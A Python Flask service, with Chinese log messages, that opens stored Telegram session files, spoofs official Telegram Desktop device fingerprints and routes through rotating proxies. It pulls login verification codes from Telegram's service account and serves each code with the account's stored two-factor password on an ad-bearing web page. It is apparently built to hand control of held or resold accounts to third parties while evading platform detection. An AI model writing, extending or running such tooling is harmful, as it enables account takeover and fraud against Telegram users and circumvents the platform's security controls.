import os
import json
import asyncio
import shutil
from flask import Flask, request
import logging
from dotenv import load_dotenv
import re
import time
import random
import sqlite3

from opentele.tl import TelegramClient
from telethon import events
from opentele.api import API

load_dotenv()

app = Flask(__name__)
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

API_ID = int(os.getenv("TELEGRAM_APP_ID"))
API_HASH = os.getenv("TELEGRAM_APP_HASH")
API_PORT = int(os.getenv("API_PORT", "7788"))

_proxy_list = None
_proxy_list_last_load = 0
PROXY_LIST_CACHE_TIME = 60

def load_proxies():
    global _proxy_list, _proxy_list_last_load
    current_time = time.time()
    if _proxy_list is not None and (current_time - _proxy_list_last_load) < PROXY_LIST_CACHE_TIME:
        return _proxy_list

    proxy_file = "proxy.txt"
    valid_proxies = []

    if not os.path.exists(proxy_file):
        logger.warning("proxy.txt 文件不存在")
        _proxy_list = []
        _proxy_list_last_load = current_time
        return []

    try:
        with open(proxy_file, 'r', encoding='utf-8') as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith('#'):
                    continue

                parts = line.split(':')
                if len(parts) >= 5:
                    ip, port, username, password, expire_ts = parts[:5]
                    try:
                        expire_timestamp = int(expire_ts)
                        if current_time < expire_timestamp:
                            proxy = {
                                'ip': ip,
                                'port': int(port),
                                'username': username,
                                'password': password,
                                'expire': expire_timestamp
                            }
                            valid_proxies.append(proxy)
                        else:
                            logger.debug(f"代理 {ip}:{port} 已过期")
                    except ValueError:
                        logger.warning(f"代理过期时间格式错误: {expire_ts}")
                        continue
    except Exception as e:
        logger.error(f"读取 proxy.txt 失败: {e}")
        _proxy_list = []
        _proxy_list_last_load = current_time
        return []

    _proxy_list = valid_proxies
    _proxy_list_last_load = current_time
    logger.info(f"加载了 {len(valid_proxies)} 个有效代理")
    return valid_proxies

def get_random_proxy():
    proxies = load_proxies()
    if not proxies:
        return None
    return random.choice(proxies)

def create_proxy_dict(proxy):
    return {
        'proxy_type': 'http',
        'addr': proxy['ip'],
        'port': proxy['port'],
        'username': proxy['username'],
        'password': proxy['password'],
        'rdns': True
    }

def get_html_template(template_name):
    template_path = os.path.join(os.path.dirname(__file__), template_name)
    if os.path.exists(template_path):
        with open(template_path, 'r', encoding='utf-8') as f:
            return f.read()
    return None

def get_twofa_from_api(sid):
    try:
        api_path = "acd/api.json"
        if os.path.exists(api_path):
            with open(api_path, 'r') as f:
                api_data = json.load(f)
                return api_data.get(sid, {}).get('two_fa', '------')
    except:
        pass
    return '------'

def get_session_config(sid):
    try:
        api_path = "acd/api.json"
        if os.path.exists(api_path):
            with open(api_path, 'r') as f:
                api_data = json.load(f)
                return api_data.get(sid, {})
    except:
        pass
    return {}

def get_ads_from_env():
    ads = []
    for i in range(1, 4):
        ads_str = os.getenv(f"ADS_{i}")
        if ads_str and '-' in ads_str:
            try:
                text, url = ads_str.split('-', 1)
                ads.append({
                    'text': text.strip(),
                    'url': url.strip()
                })
            except ValueError:
                continue
    return ads

def render_with_ads(template_name, **kwargs):
    template = get_html_template(template_name)
    if not template:
        return None

    ads_data = get_ads_from_env()
    ads_meta = json.dumps(ads_data, ensure_ascii=False)

    for key, value in kwargs.items():
        template = template.replace(f'{{{key}}}', str(value))

    meta_tag = f'<meta name="ads-data" content=\'{ads_meta}\'>'
    template = template.replace('<head>', f'<head>{meta_tag}')

    return template

def fix_session_file(session_path):
    if not os.path.exists(session_path):
        return False
    backup_path = session_path + ".bak"
    try:
        conn = sqlite3.connect(session_path)
        cursor = conn.cursor()
        cursor.execute("PRAGMA table_info(sessions)")
        columns = cursor.fetchall()
        if len(columns) >= 6:
            shutil.copy2(session_path, backup_path)
            cursor.execute('''
                CREATE TABLE sessions_new (
                    dc_id INTEGER PRIMARY KEY,
                    server_address TEXT,
                    port INTEGER,
                    auth_key BLOB,
                    takeout_id INTEGER
                )
            ''')
            cursor.execute('''
                INSERT INTO sessions_new (dc_id, server_address, port, auth_key, takeout_id)
                SELECT dc_id, server_address, port, auth_key, takeout_id FROM sessions
            ''')
            cursor.execute('DROP TABLE sessions')
            cursor.execute('ALTER TABLE sessions_new RENAME TO sessions')
            conn.commit()
            logger.info(f"已修复会话文件 {session_path}，备份已保存至 {backup_path}")
            return True
    except Exception as e:
        logger.warning(f"修复会话文件失败 {session_path}: {e}")
        if os.path.exists(backup_path):
            shutil.copy2(backup_path, session_path)
            logger.info(f"已从备份恢复 {session_path}")
    finally:
        try:
            conn.close()
        except:
            pass
    return False

def restore_session_if_needed(session_path):
    backup_path = session_path + ".bak"
    if os.path.exists(backup_path):
        shutil.copy2(backup_path, session_path)
        os.remove(backup_path)
        logger.info(f"已从备份恢复并删除备份文件 {session_path}")
        return True
    return False

@app.route('/getcode', methods=['GET'])
def get_code():
    sid = request.args.get('id')
    if not sid:
        return render_with_ads('unavailable.html', error='缺少id参数'), 400

    session_path = f"acd/{sid}.session"
    if not os.path.exists(session_path):
        return render_with_ads('unavailable.html', error='Session不存在'), 404

    twofa = get_twofa_from_api(sid)
    code = fetch_code_sync(sid, session_path)

    if code:
        return render_with_ads('suc.html', code=code, twofa=twofa)

    return render_with_ads('unavailable.html', error='未获取到验证码'), 404

def fetch_code_sync(sid, session_path):
    async def _fetch():
        config = get_session_config(sid)
        app_id = config.get('app_id')
        if app_id is None:
            app_id = API_ID
        else:
            try:
                app_id = int(app_id)
            except (ValueError, TypeError):
                app_id = API_ID

        app_hash = config.get('app_hash')
        if not app_hash:
            app_hash = API_HASH

        device_model = config.get('device_model') or None
        app_version = config.get('app_version') or None
        system_lang_code = config.get('system_lang_code') or None
        system_vision = config.get('system_vision') or None
        lang_pack = config.get('lang_pack') or None

        official_api = API.TelegramDesktop.Generate()
        
        if device_model:
            official_api.device_model = device_model
        if app_version:
            official_api.app_version = app_version
        if system_lang_code:
            official_api.system_lang_code = system_lang_code
        if system_vision:
            official_api.system_version = system_vision
        if lang_pack:
            official_api.lang_pack = lang_pack
            official_api.lang_code = lang_pack
        
        official_api.api_id = app_id
        official_api.api_hash = app_hash

        fix_session_file(session_path)

        proxy = get_random_proxy()
        proxy_dict = create_proxy_dict(proxy) if proxy else None

        try:
            client = TelegramClient(
                session_path,
                api=official_api,
                proxy=proxy_dict
            )
        except ValueError as e:
            if "too many values to unpack" in str(e):
                logger.error(f"TelegramClient 初始化失败 {sid}: {e}，尝试恢复备份")
                restore_session_if_needed(session_path)
            return None

        try:
            await client.connect()
            if not await client.is_user_authorized():
                return None
            
            msgs = await client.get_messages(777000, limit=20)
            for msg in msgs:
                text = msg.message or ''
                codes = re.findall(r'\d{5,6}', text)
                if codes:
                    latest_code = codes[0]
                    logger.info(f"从历史消息获取最新验证码 {latest_code} for {sid}")
                    return latest_code
            
            future = asyncio.Future()

            @client.on(events.NewMessage)
            async def handler(event):
                if event.sender_id == 777000:
                    text = event.message.message or ''
                    codes = re.findall(r'\d{5,6}', text)
                    if codes and not future.done():
                        logger.info(f"从新消息获取验证码 {codes[0]} for {sid}")
                        future.set_result(codes[0])
                        await client.disconnect()

            try:
                result = await asyncio.wait_for(future, timeout=30)
                return result
            except asyncio.TimeoutError:
                logger.info(f"获取验证码超时 {sid}")
                return None

        except Exception as e:
            logger.error(f"获取验证码失败 {sid}: {e}")
            return None
        finally:
            await client.disconnect()
            backup_path = session_path + ".bak"
            if os.path.exists(backup_path):
                os.remove(backup_path)
                logger.debug(f"已删除成功会话的备份文件 {backup_path}")

    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        return loop.run_until_complete(_fetch())
    finally:
        loop.close()

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=API_PORT, debug=False)
